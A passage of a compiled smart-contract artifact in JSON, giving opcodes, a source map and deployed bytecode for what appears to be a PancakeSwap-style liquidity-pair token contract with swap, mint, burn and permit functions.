PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP6 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 LT PUSH2 0x249B JUMPI DUP2 PUSH2 0x249D JUMP JUMPDEST DUP3 JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x24CD SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SWAP2 SWAP1 SWAP2 SSTORE SLOAD PUSH2 0x24FA SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x258D JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x42455032303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x25A0 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x25CB SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP7 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP PUSH1 0x1 SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND PUSH1 0x1 PUSH1 0x70 SHL MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP3 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB DUP5 AND DUP2 PUSH2 0x2645 JUMPI INVALID JUMPDEST DIV SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0xCD8 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID 0x4F PUSH15 0x6C79206F776E65722063616E206361 PUSH13 0x6C20746869732066756E637469 PUSH16 0x6E50616E63616B653A20494E53554646 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x49 0x4E POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD SSTORE PUSH15 0x697377617056323A20494E53554646 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F TIMESTAMP SSTORE MSTORE 0x4E GASLIMIT DIFFICULTY 0xDD CALLCODE MSTORE 0xAD SHL 0xE2 0xC8 SWAP12 PUSH10 0xC2B068FC378DAA952BA7 CALL PUSH4 0xC4A11628 CREATE2 GAS 0x4D CREATE2 0x23 0xB3 0xEF POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4F SSTORE SLOAD POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY LOG2 PUSH6 0x627A7A723158 KECCAK256 0xCF SWAP1 DUP10 0xF7 DUP8 0xDB 0x5C 0x2A PUSH13 0xA32EBE2DC67686BE59FF857F8A 0xC4 PUSH26 0xE4A2EDBCA7AAF7C464736F6C6343000510003245495037313244 PUSH16 0x6D61696E28737472696E67206E616D65 0x2C PUSH20 0x7472696E672076657273696F6E2C75696E743235 CALLDATASIZE KECCAK256 PUSH4 0x6861696E 0x49 PUSH5 0x2C61646472 PUSH6 0x737320766572 PUSH10 0x6679696E67436F6E7472 PUSH2 0x6374 0x29 ",
							"sourceMap": "226:18534:6:-;;;325:70;;;-1:-1:-1;;;;;;325:70:6;353:42;325:70;;;;1140:25;;2685:87;5:2:-1;;;;30:1;27;20:12;5:2;-1:-1;1203:133:0;;1107:7;;1203:133;;;;;;;;;;;;;;;;1370:4;;;;;;;;;-1:-1:-1;;;1370:4:0;;;;;1404:10;;;;;;;;;;-1:-1:-1;;;1404:10:0;;;;1175:310;;;;;;;;;1354:22;1175:310;;;;1394:21;1175:310;;;;;;;;;;;1466:4;1175:310;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;1175:310:0;;;;;;;1152:343;;;;;1133:16;:362;-1:-1:-1;2716:20:6;;-1:-1:-1;;;;;;2716:20:6;;;2726:10;2716:20;;;;;;2747:5;:18;;;;;;;;;;226:18534;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106101fb5760003560e01c806370a082311161011a578063ba9a7a56116100ad578063d505accf1161007c578063d505accf146105e9578063dcbbb3731461063a578063dd62ed3e14610660578063f317739c1461068e578063fff6cae914610696576101fb565b8063ba9a7a56146105ab578063bc25cf77146105b3578063c45a0155146105d9578063d21220a7146105e1576101fb565b80638da5cb5b116100e95780638da5cb5b14610567578063900820d81461056f57806395d89b4114610577578063a9059cbb1461057f576101fb565b806370a08231146104d45780637464fc3d146104fa5780637ecebe001461050257806389afcb4414610528576101fb565b806330adf81f116101925780635909c0d5116101615780635909c0d5146104815780635a3d5493146104895780636488f7b0146104915780636a627842146104ae576101fb565b806330adf81f1461042d578063313ce567146104355780633644e5151461045357806347d5d8561461045b576101fb565b80630dfe1681116101ce5780630dfe1681146103835780631794bb3c146103a757806318160ddd146103dd57806323b872dd146103f7576101fb565b8063022c0d9f1461020057806306fdde031461028e5780630902f1ac1461030b578063095ea7b314610343575b600080fd5b61028c6004803603608081101561021657600080fd5b8135916020810135916001600160a01b03604083013516919081019060808101606082013564010000000081111561024d57600080fd5b82018360208201111561025f57600080fd5b8035906020019184600183028401116401000000008311171561028157600080fd5b50909250905061069e565b005b610296610c7a565b6040805160208082528351818301528351919283929083019185019080838360005b838110156102d05781810151838201526020016102b8565b50505050905090810190601f1680156102fd5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610313610c9d565b604080516001600160701b03948516815292909316602083015263ffffffff168183015290519081900360600190f35b61036f6004803603604081101561035957600080fd5b506001600160a01b038135169060200135610cc7565b604080519115158252519081900360200190f35b61038b610cde565b604080516001600160a01b039092168252519081900360200190f35b61028c600480360360608110156103bd57600080fd5b506001600160a01b03813581169160208101359091169060400135610ced565b6103e5610d76565b60408051918252519081900360200190f35b61036f6004803603606081101561040d57600080fd5b506001600160a01b03813581169160208101359091169060400135610d7c565b6103e5610e16565b61043d610e3a565b6040805160ff9092168252519081900360200190f35b6103e5610e3f565b6103e56004803603602081101561047157600080fd5b50356001600160a01b0316610e45565b6103e5610e57565b6103e5610e5d565b61028c600480360360208110156104a757600080fd5b5035610e63565b6103e5600480360360208110156104c457600080fd5b50356001600160a01b0316610eb1565b6103e5600480360360208110156104ea57600080fd5b50356001600160a01b03166111af565b6103e56111c1565b6103e56004803603602081101561051857600080fd5b50356001600160a01b03166111c7565b61054e6004803603602081101561053e57600080fd5b50356001600160a01b03166111d9565b6040805192835260208301919091528051918290030190f35b61038b61157d565b61038b61158c565b61029661159b565b61036f6004803603604081101561059557600080fd5b506001600160a01b0381351690602001356115bd565b6103e56115ca565b61028c600480360360208110156105c957600080fd5b50356001600160a01b03166115d0565b61038b611739565b61038b611748565b61028c600480360360e08110156105ff57600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135611757565b6103e56004803603602081101561065057600080fd5b50356001600160a01b0316611957565b6103e56004803603604081101561067657600080fd5b506001600160a01b0381358116916020013516611ba6565b6103e5611bc3565b61028c611bc9565b6010546001146106e7576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601055841515806106fa5750600084115b6107355760405162461bcd60e51b815260040180806020018281038252602381526020018061274e6023913960400191505060405180910390fd5b600080610740610c9d565b5091509150816001600160701b0316871080156107655750806001600160701b031686105b6107b6576040805162461bcd60e51b815260206004820152601f60248201527f50616e63616b653a20494e53554646494349454e545f4c495155494449545900604482015290519081900360640190fd5b60008060006064600a548b02816107c957fe5b048a03905060006064600a548b02816107de57fe5b600854600954929091048c0392506001600160a01b03908116918116908b16821480159061081e5750806001600160a01b03168b6001600160a01b031614155b610865576040805162461bcd60e51b815260206004820152601360248201527250616e63616b653a20494e56414c49445f544f60681b604482015290519081900360640190fd5b8c1561087657610876828c86611d29565b8b1561088757610887818c85611d29565b8815610942578a6001600160a01b031663848008123386868e8e6040518663ffffffff1660e01b815260040180866001600160a01b03166001600160a01b03168152602001858152602001848152602001806020018281038252848482818152602001925080828437600081840152601f19601f8201169050808301925050509650505050505050600060405180830381600087803b15801561092957600080fd5b505af115801561093d573d6000803e3d6000fd5b505050505b60006064600a548f028161095257fe5b04905060006064600a548f028161096557fe5b0490508e15610986576006546109869085906001600160a01b031684611d29565b8d156109a4576006546109a49084906001600160a01b031683611d29565b604080516370a0823160e01b815230600482015290516001600160a01b038616916370a08231916024808301926020929190829003018186803b1580156109ea57600080fd5b505afa1580156109fe573d6000803e3d6000fd5b505050506040513d6020811015610a1457600080fd5b5051604080516370a0823160e01b815230600482015290519199506001600160a01b038516916370a0823191602480820192602092909190829003018186803b158015610a6057600080fd5b505afa158015610a74573d6000803e3d6000fd5b505050506040513d6020811015610a8a57600080fd5b505196506000955050505050506001600160701b0385168a90038311610ab1576000610ac0565b89856001600160701b03160383035b9050600089856001600160701b0316038311610add576000610aec565b89856001600160701b03160383035b90506000821180610afd5750600081115b610b385760405162461bcd60e51b81526004018080602001828103825260228152602001806126be6022913960400191505060405180910390fd5b6000610b6c610b4e84601963ffffffff611ec316565b610b608761271063ffffffff611ec316565b9063ffffffff611f2616565b90506000610b84610b4e84601963ffffffff611ec316565b9050610bb66305f5e100610baa6001600160701b038b8116908b1663ffffffff611ec316565b9063ffffffff611ec316565b610bc6838363ffffffff611ec316565b1015610c06576040805162461bcd60e51b815260206004820152600a60248201526950616e63616b653a204b60b01b604482015290519081900360640190fd5b5050610c1484848888611f76565b60408051838152602081018390528082018d9052606081018c905290516001600160a01b038b169133917fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d8229181900360800190a350506001601055505050505050505050565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b600b546001600160701b0380821692600160701b830490911691600160e01b900463ffffffff1690565b6000610cd4338484612139565b5060015b92915050565b6008546001600160a01b031681565b6007546001600160a01b03163314610d41576040805162461bcd60e51b81526020600482015260126024820152712830b731b0b5b29d102327a92124a22222a760711b604482015290519081900360640190fd5b600880546001600160a01b039485166001600160a01b0319918216179091556009805493909416921691909117909155600a55565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610e01576001600160a01b0384166000908152600260209081526040808320338452909152902054610ddc908363ffffffff611f2616565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b610e0c84848461219b565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b600c5481565b600d5481565b600f546001600160a01b03163314610eac5760405162461bcd60e51b815260040180806020018281038252602181526020018061269d6021913960400191505060405180910390fd5b600a55565b6000601054600114610efc576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601081905580610f0c610c9d565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015610f6057600080fd5b505afa158015610f74573d6000803e3d6000fd5b505050506040513d6020811015610f8a57600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015610fdd57600080fd5b505afa158015610ff1573d6000803e3d6000fd5b505050506040513d602081101561100757600080fd5b505190506000611026836001600160701b03871663ffffffff611f2616565b90506000611043836001600160701b03871663ffffffff611f2616565b905060006110518787612243565b6000549091508061108e5761107a6103e8610b60611075878763ffffffff611ec316565b6123b6565b985061108960006103e8612408565b6110dd565b6110da6001600160701b0389166110ab868463ffffffff611ec316565b816110b257fe5b046001600160701b0389166110cd868563ffffffff611ec316565b816110d457fe5b0461248c565b98505b6000891161111c5760405162461bcd60e51b81526004018080602001828103825260268152602001806127716026913960400191505060405180910390fd5b6111268a8a612408565b61113286868a8a611f76565b811561116257600b5461115e906001600160701b0380821691600160701b90041663ffffffff611ec316565b600e555b6040805185815260208101859052815133927f4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f928290030190a25050600160105550949695505050505050565b60016020526000908152604090205481565b600e5481565b60056020526000908152604090205481565b600080601054600114611225576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601081905580611235610c9d565b50600854600954604080516370a0823160e01b815230600482015290519496509294506001600160a01b039182169391169160009184916370a08231916024808301926020929190829003018186803b15801561129157600080fd5b505afa1580156112a5573d6000803e3d6000fd5b505050506040513d60208110156112bb57600080fd5b5051604080516370a0823160e01b815230600482015290519192506000916001600160a01b038516916370a08231916024808301926020929190829003018186803b15801561130957600080fd5b505afa15801561131d573d6000803e3d6000fd5b505050506040513d602081101561133357600080fd5b5051306000908152600160205260408120549192506113528888612243565b60005490915080611369848763ffffffff611ec316565b8161137057fe5b049a5080611384848663ffffffff611ec316565b8161138b57fe5b04995060008b11801561139e575060008a115b6113d95760405162461bcd60e51b81526004018080602001828103825260268152602001806127086026913960400191505060405180910390fd5b6113e330846124a4565b6113ee878d8d611d29565b6113f9868d8c611d29565b604080516370a0823160e01b815230600482015290516001600160a01b038916916370a08231916024808301926020929190829003018186803b15801561143f57600080fd5b505afa158015611453573d6000803e3d6000fd5b505050506040513d602081101561146957600080fd5b5051604080516370a0823160e01b815230600482015290519196506001600160a01b038816916370a0823191602480820192602092909190829003018186803b1580156114b557600080fd5b505afa1580156114c9573d6000803e3d6000fd5b505050506040513d60208110156114df57600080fd5b505193506114ef85858b8b611f76565b811561151f57600b5461151b906001600160701b0380821691600160701b90041663ffffffff611ec316565b600e555b604080518c8152602081018c905281516001600160a01b038f169233927fdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496929081900390910190a35050505050505050506001601081905550915091565b600f546001600160a01b031681565b6006546001600160a01b031681565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b6000610cd433848461219b565b6103e881565b601054600114611619576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601055600854600954600b54604080516370a0823160e01b815230600482015290516001600160a01b0394851694909316926116c892859287926116c3926001600160701b03169185916370a0823191602480820192602092909190829003018186803b15801561168b57600080fd5b505afa15801561169f573d6000803e3d6000fd5b505050506040513d60208110156116b557600080fd5b50519063ffffffff611f2616565b611d29565b600b54604080516370a0823160e01b8152306004820152905161172f92849287926116c392600160701b90046001600160701b0316916001600160a01b038616916370a0823191602480820192602092909190829003018186803b15801561168b57600080fd5b5050600160105550565b6007546001600160a01b031681565b6009546001600160a01b031681565b4284101561179f576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa1580156118ba573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906118f05750886001600160a01b0316816001600160a01b0316145b611941576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b61194c898989612139565b505050505050505050565b60006010546001146119a2576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b60006010819055806119b2610c9d565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015611a0657600080fd5b505afa158015611a1a573d6000803e3d6000fd5b505050506040513d6020811015611a3057600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611a8357600080fd5b505afa158015611a97573d6000803e3d6000fd5b505050506040513d6020811015611aad57600080fd5b505190506000611acc836001600160701b03871663ffffffff611f2616565b90506000611ae9836001600160701b03871663ffffffff611f2616565b90506000611af78787612243565b60005490915080611b3057611b1b6103e8610b60611075878763ffffffff611ec316565b9850611b2a60006103e8612530565b50611b50565b611b4d6001600160701b0389166110ab868463ffffffff611ec316565b98505b60008911611b8f5760405162461bcd60e51b81526004018080602001828103825260288152602001806126e06028913960400191505060405180910390fd5b611b998a8a612530565b5061113286868a8a611f76565b600260209081526000928352604080842090915290825290205481565b600a5481565b601054600114611c12576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601055600854604080516370a0823160e01b81523060048201529051611d22926001600160a01b0316916370a08231916024808301926020929190829003018186803b158015611c6357600080fd5b505afa158015611c77573d6000803e3d6000fd5b505050506040513d6020811015611c8d57600080fd5b5051600954604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611cda57600080fd5b505afa158015611cee573d6000803e3d6000fd5b505050506040513d6020811015611d0457600080fd5b5051600b546001600160701b0380821691600160701b900416611f76565b6001601055565b604080518082018252601981527f7472616e7366657228616464726573732c75696e74323536290000000000000060209182015281516001600160a01b0385811660248301526044808301869052845180840390910181526064909201845291810180516001600160e01b031663a9059cbb60e01b1781529251815160009460609489169392918291908083835b60208310611dd65780518252601f199092019160209182019101611db7565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114611e38576040519150601f19603f3d011682016040523d82523d6000602084013e611e3d565b606091505b5091509150818015611e6b575080511580611e6b5750808060200190516020811015611e6857600080fd5b50515b611ebc576040805162461bcd60e51b815260206004820152601860248201527f50616e63616b653a205452414e534645525f4641494c45440000000000000000604482015290519081900360640190fd5b5050505050565b6000811580611ede57505080820282828281611edb57fe5b04145b610cd8576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6d756c2d6f766572666c6f7760601b604482015290519081900360640190fd5b80820382811115610cd8576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160701b038411801590611f9457506001600160701b038311155b611fd9576040805162461bcd60e51b815260206004820152601160248201527050616e63616b653a204f564552464c4f5760781b604482015290519081900360640190fd5b600b5463ffffffff42811691600160e01b9004811682039081161580159061200957506001600160701b03841615155b801561201d57506001600160701b03831615155b1561208e578063ffffffff1661204b8561203686612616565b6001600160e01b03169063ffffffff61262816565b600c80546001600160e01b03929092169290920201905563ffffffff81166120768461203687612616565b600d80546001600160e01b0392909216929092020190555b600b80546dffffffffffffffffffffffffffff19166001600160701b03888116919091176dffffffffffffffffffffffffffff60701b1916600160701b8883168102919091176001600160e01b0316600160e01b63ffffffff871602179283905560408051848416815291909304909116602082015281517f1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1929181900390910190a1505050505050565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b0383166000908152600160205260409020546121c4908263ffffffff611f2616565b6001600160a01b0380851660009081526001602052604080822093909355908416815220546121f9908263ffffffff61264d16565b6001600160a01b03808416600081815260016020908152604091829020949094558051858152905191939287169260008051602061272e83398151915292918290030190a3505050565b600080600760009054906101000a90046001600160a01b03166001600160a01b031663017e7e586040518163ffffffff1660e01b815260040160206040518083038186803b15801561229457600080fd5b505afa1580156122a8573d6000803e3d6000fd5b505050506040513d60208110156122be57600080fd5b5051600e546001600160a01b0382161580159450919250906123a257801561239d5760006123016110756001600160701b0388811690881663ffffffff611ec316565b9050600061230e836123b6565b90508082111561239a5760006123416008610baa612332868663ffffffff611f2616565b6000549063ffffffff611ec316565b9050600061237661235984600863ffffffff611ec316565b61236a86601163ffffffff611ec316565b9063ffffffff61264d16565b9050600081838161238357fe5b0490508015612396576123968782612408565b5050505b50505b6123ae565b80156123ae576000600e555b505092915050565b600060038211156123f9575080600160028204015b818110156123f3578091506002818285816123e257fe5b0401816123eb57fe5b0490506123cb565b50612403565b8115612403575060015b919050565b60005461241b908263ffffffff61264d16565b60009081556001600160a01b038316815260016020526040902054612446908263ffffffff61264d16565b6001600160a01b038316600081815260016020908152604080832094909455835185815293519293919260008051602061272e8339815191529281900390910190a35050565b600081831061249b578161249d565b825b9392505050565b6001600160a01b0382166000908152600160205260409020546124cd908263ffffffff611f2616565b6001600160a01b038316600090815260016020526040812091909155546124fa908263ffffffff611f2616565b60009081556040805183815290516001600160a01b0385169160008051602061272e833981519152919081900360200190a35050565b60006001600160a01b03831661258d576040805162461bcd60e51b815260206004820152601f60248201527f42455032303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b6000546125a0908363ffffffff61264d16565b60009081556001600160a01b0384168152600360205260409020546125cb908363ffffffff61264d16565b6001600160a01b038416600081815260036020908152604080832094909455835186815293519293919260008051602061272e8339815191529281900390910190a350600192915050565b6001600160701b0316600160701b0290565b60006001600160701b0382166001600160e01b0384168161264557fe5b049392505050565b80820182811015610cd8576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfe4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6e50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e54454450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e5450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544a265627a7a72315820cf9089f787db5c2a6ca32ebe2dc67686be59ff857f8ac479e4a2edbca7aaf7c464736f6c63430005100032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1FB JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x11A JUMPI DUP1 PUSH4 0xBA9A7A56 GT PUSH2 0xAD JUMPI DUP1 PUSH4 0xD505ACCF GT PUSH2 0x7C JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x5E9 JUMPI DUP1 PUSH4 0xDCBBB373 EQ PUSH2 0x63A JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x660 JUMPI DUP1 PUSH4 0xF317739C EQ PUSH2 0x68E JUMPI DUP1 PUSH4 0xFFF6CAE9 EQ PUSH2 0x696 JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0xBA9A7A56 EQ PUSH2 0x5AB JUMPI DUP1 PUSH4 0xBC25CF77 EQ PUSH2 0x5B3 JUMPI DUP1 PUSH4 0xC45A0155 EQ PUSH2 0x5D9 JUMPI DUP1 PUSH4 0xD21220A7 EQ PUSH2 0x5E1 JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x8DA5CB5B GT PUSH2 0xE9 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x567 JUMPI DUP1 PUSH4 0x900820D8 EQ PUSH2 0x56F JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x577 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x57F JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x4D4 JUMPI DUP1 PUSH4 0x7464FC3D EQ PUSH2 0x4FA JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x502 JUMPI DUP1 PUSH4 0x89AFCB44 EQ PUSH2 0x528 JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x30ADF81F GT PUSH2 0x192 JUMPI DUP1 PUSH4 0x5909C0D5 GT PUSH2 0x161 JUMPI DUP1 PUSH4 0x5909C0D5 EQ PUSH2 0x481 JUMPI DUP1 PUSH4 0x5A3D5493 EQ PUSH2 0x489 JUMPI DUP1 PUSH4 0x6488F7B0 EQ PUSH2 0x491 JUMPI DUP1 PUSH4 0x6A627842 EQ PUSH2 0x4AE JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x42D JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x435 JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x453 JUMPI DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x45B JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0xDFE1681 GT PUSH2 0x1CE JUMPI DUP1 PUSH4 0xDFE1681 EQ PUSH2 0x383 JUMPI DUP1 PUSH4 0x1794BB3C EQ PUSH2 0x3A7 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x3DD JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x3F7 JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x22C0D9F EQ PUSH2 0x200 JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x28E JUMPI DUP1 PUSH4 0x902F1AC EQ 